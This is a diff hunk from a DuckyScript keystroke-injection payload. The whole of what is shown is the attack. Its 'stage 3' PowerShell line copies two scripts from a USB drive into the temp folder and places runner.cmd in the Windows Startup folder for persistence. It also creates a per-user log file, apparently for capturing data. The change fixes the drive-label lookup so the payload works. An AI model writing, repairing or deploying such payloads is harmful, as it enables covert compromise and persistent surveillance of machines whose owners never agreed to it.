@@ -14,7 +14,7 @@ ENTER
 REM stage 3
 REM place the files to their destination
 REM replace 'X' with your drive's label name
-STRING $u=gwmi win32_volume|?{$_.LabelName -eq 'L'};cd $u.name;cp ./x.ps1 $env:temp;cp ./l.ps1 $env:temp;cp ./runner.cmd "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\";cd $env:temp;echo "">"$env:username.log";
+STRING $u=gwmi win32_volume|?{$_.Label -eq 'X'};cd $u.name;cp ./x.ps1 $env:temp;cp ./l.ps1 $env:temp;cp ./runner.cmd "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\";cd $env:temp;echo "">"$env:username.log";
 ENTER
 DELAY 200
 
